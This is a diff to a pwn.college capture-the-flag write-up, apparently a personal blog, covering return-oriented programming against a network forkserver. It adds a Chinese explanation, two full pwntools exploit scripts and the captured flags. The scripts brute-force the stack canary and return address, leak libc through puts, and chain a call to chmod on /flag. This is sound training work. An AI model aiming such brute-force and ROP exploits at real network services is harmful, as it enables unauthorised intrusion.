@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-24 13:36"
+modDate: "2025-01-27 23:27"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -4732,12 +4732,455 @@ int __fastcall challenge(int a1, __int64 a2, __int64 a3)
 
 `forkserver`，典。
 
-爆破 Canary、ret2challenge leak libc 再 ROP 应该就好了。2.9 有个 Nu1L Junior 招新赛，我得去抽个热闹，万一选上了岂不是很爽，但是现在才学到 ROP，好在还有一点时间，得提前学点堆了，就怕到时候遇到堆题啥也不会就死了……
+爆破 Canary、ret2main, leak libc 再 ROP 应该就好了。2.9 有个 Nu1L Junior 招新赛，我得去抽个热闹，万一选上了岂不是很爽，但是现在才学到 ROP，好在还有一点时间，得提前学点堆了，就怕到时候遇到堆题啥也不会就死了……
 
 反正这章只剩下两道题，我就先鸽着了，看了下简介感觉都不难，感觉无非就是把所有知识综合起来罢了。
 
+吗的 Heap 镇南，我被蹂躏的好惨，还是先把这两题打了稳固下 rank 吧。
+
+重新总结下思路：因为是 forkserver，子进程会沿用父进程的内存布局，所以我们可以把 canary 和 retaddr 爆破出来。有了 retaddr 后我们就可以使用一些程序本身的 gadgets 了，但是这些 gadgets 中不包含 syscall 什么的，所以不能做一些很 powerful 的事情，但是 libc 里面一定有好东西，那么问题就在于怎么获得 libc 基地址了。因为这个程序使用了 `puts` 函数，所以我们可以构造两个 stage payload，第一个 stage 用 `puts@plt` 泄漏 `__libc_start_main` 的地址，第二个 stage 根据泄漏出来的地址计算 libc 基地址，然后构造 ROP Chain Do anything what you want to do!
+
 ### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p8,
+    process,
+    remote,
+    sleep,
+    time,
+)
+from pwnlib.gdb import psutil
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level14.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+set follow-fork-mode child
+b *challenge+383
+c
+"""
+
+CANARY_OFFSET = 0x48
+ELF_OFFSET = 0x23C8
+LIBC_OFFSET = 0x23F90
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def get_forked_pid(parent_pid):
+    children = psutil.Process(parent_pid).children()
+
+    if len(children) != 1:
+        raise ValueError(f"Expected 1 child process, found {len(children)}")
+
+    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")
+
+    return children[0].pid
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)
+
+        if debug:
+            if attach:
+                nc_process = process(["nc", HOST, str(PORT)])
+                sleep(1)
+
+                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)
+
+                return nc_process
+            else:
+                target.close()
+
+                return gdb.debug(
+                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+                )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def brute_force(target_type, fixed_byte, canary=b""):
+    current = fixed_byte
+    length = 0x8 if target_type == "canary" else 0x6
+    start_time = time.time()
+
+    while len(current) < length:
+        for byte in range(0x0, 0xFF):
+            with remote(HOST, PORT) as target:
+                payload = flat(
+                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
+                    if target_type == "canary"
+                    else b"".ljust(CANARY_OFFSET, b"A")
+                    + canary
+                    + b"".ljust(0x8, b"A")
+                    + current
+                    + p8(byte)
+                )
+
+                target.send(payload)
+
+                response = target.recvall(timeout=3)
+
+                if (
+                    target_type == "canary"
+                    and b"*** stack smashing detected ***" not in response
+                ) or (target_type == "retaddr" and b"Goodbye!" in response):
+                    current += p8(byte)
+                    break
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+
+    log.success(
+        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
+    )
+
+    return current
+
+
+def construct_payload(stage, canary, retaddr, leaked_libc=None):
+    elf.address = int.from_bytes(retaddr, "little") - ELF_OFFSET
+
+    rop = ROP(elf)
+
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_pop_r15_ret = rop.rsi.address
+
+    if stage == 1:
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            pop_rdi_ret,
+            elf.got["__libc_start_main"],
+            elf.plt["puts"],
+        )
+    elif stage == 2:
+        if leaked_libc is None:
+            log.failure("libc_base is required for stage 2!")
+            exit()
+
+        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+        libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET
+
+        filename = next(elf.search(b"GNU"))
+        mode = 0o4
+
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            pop_rdi_ret,
+            filename,
+            pop_rsi_pop_r15_ret,
+            mode,
+            b"".ljust(0x8, b"A"),
+            libc.symbols["chmod"],
+        )
+
+
+def attack(stage, canary=None, retaddr=None, leaked_libc=None):
+    try:
+        if stage == 1:
+            with remote(HOST, PORT) as target:
+                payload = construct_payload(1, canary, retaddr)
+                target.send(payload)
+
+                response = target.recvall(timeout=1)
+
+                return response[-7:].rstrip()
+        elif stage == 2:
+            os.system("ln -s /flag GNU")
+
+            with remote(HOST, PORT) as target:
+                payload = construct_payload(2, canary, retaddr, leaked_libc)
+
+                target.send(payload)
+                target.recvall(timeout=1)
+
+            try:
+                with open("/flag", "r") as f:
+                    log.success(f.read())
+                return True
+            except FileNotFoundError:
+                log.exception("The file '/flag' does not exist.")
+            except PermissionError:
+                log.failure("Permission denied to read '/flag'.")
+        else:
+            log.error(b"Invalid stage number!")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        launch(debug=False, attach=False)
+
+        canary = brute_force("canary", b"\x00")
+        retaddr = brute_force("retaddr", b"\xc8", canary)
+        leaked_libc = attack(1, canary, retaddr)
+
+        if attack(2, canary, retaddr, leaked_libc):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
 
 ### Flag
 
-Flag: ``
+Flag: `pwn.college{wJF3GTTKHHSqaWXrhLMIUW4ocoT.01N2MDL5cTNxgzW}`
+
+## Level 14.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform ROP against a network forkserver!
+
+### Write-up
+
+参见 [Level 14.0](#level-140)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p8,
+    process,
+    remote,
+    sleep,
+    time,
+)
+from pwnlib.gdb import psutil
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level14.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+set follow-fork-mode child
+c
+"""
+
+CANARY_OFFSET = 0x48
+ELF_OFFSET = 0x1726
+LIBC_OFFSET = 0x23F90
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def get_forked_pid(parent_pid):
+    children = psutil.Process(parent_pid).children()
+
+    if len(children) != 1:
+        raise ValueError(f"Expected 1 child process, found {len(children)}")
+
+    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")
+
+    return children[0].pid
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)
+
+        if debug:
+            if attach:
+                nc_process = process(["nc", HOST, str(PORT)])
+                sleep(1)
+
+                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)
+
+                return nc_process
+            else:
+                target.close()
+
+                return gdb.debug(
+                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+                )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def brute_force(target_type, fixed_byte, canary=b""):
+    current = fixed_byte
+    length = 0x8 if target_type == "canary" else 0x6
+    start_time = time.time()
+
+    while len(current) < length:
+        for byte in range(0x0, 0xFF):
+            with remote(HOST, PORT) as target:
+                payload = flat(
+                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
+                    if target_type == "canary"
+                    else b"".ljust(CANARY_OFFSET, b"A")
+                    + canary
+                    + b"".ljust(0x8, b"A")
+                    + current
+                    + p8(byte)
+                )
+
+                target.send(payload)
+
+                response = target.recvall(timeout=3)
+
+                if (
+                    target_type == "canary"
+                    and b"*** stack smashing detected ***" not in response
+                ) or (target_type == "retaddr" and b"Goodbye!" in response):
+                    current += p8(byte)
+                    break
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+
+    log.success(
+        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
+    )
+
+    return current
+
+
+def construct_payload(stage, canary, retaddr, leaked_libc=None):
+    elf.address = int.from_bytes(retaddr, "little") - ELF_OFFSET
+
+    rop = ROP(elf)
+
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_pop_r15_ret = rop.rsi.address
+
+    if stage == 1:
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            pop_rdi_ret,
+            elf.got["__libc_start_main"],
+            elf.plt["puts"],
+        )
+    elif stage == 2:
+        if leaked_libc is None:
+            log.failure("libc_base is required for stage 2!")
+            exit()
+
+        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+        libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET
+
+        filename = next(elf.search(b"GNU"))
+        mode = 0o4
+
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            pop_rdi_ret,
+            filename,
+            pop_rsi_pop_r15_ret,
+            mode,
+            b"".ljust(0x8, b"A"),
+            libc.symbols["chmod"],
+        )
+
+
+def attack(stage, canary=None, retaddr=None, leaked_libc=None):
+    try:
+        if stage == 1:
+            with remote(HOST, PORT) as target:
+                payload = construct_payload(1, canary, retaddr)
+                target.send(payload)
+
+                response = target.recvall(timeout=1)
+
+                return response[-7:].rstrip()
+        elif stage == 2:
+            os.system("ln -s /flag GNU")
+
+            with remote(HOST, PORT) as target:
+                payload = construct_payload(2, canary, retaddr, leaked_libc)
+
+                target.send(payload)
+                target.recvall(timeout=1)
+
+            try:
+                with open("/flag", "r") as f:
+                    log.success(f.read())
+                return True
+            except FileNotFoundError:
+                log.exception("The file '/flag' does not exist.")
+            except PermissionError:
+                log.failure("Permission denied to read '/flag'.")
+        else:
+            log.error(b"Invalid stage number!")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        launch(debug=False, attach=False)
+
+        canary = brute_force("canary", b"\x00")
+        retaddr = brute_force("retaddr", b"\x26", canary)
+        leaked_libc = attack(1, canary, retaddr)
+
+        if attack(2, canary, retaddr, leaked_libc):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{IcjKEpDUZ1r43p0FESk4RB96-1s.0FO2MDL5cTNxgzW}`
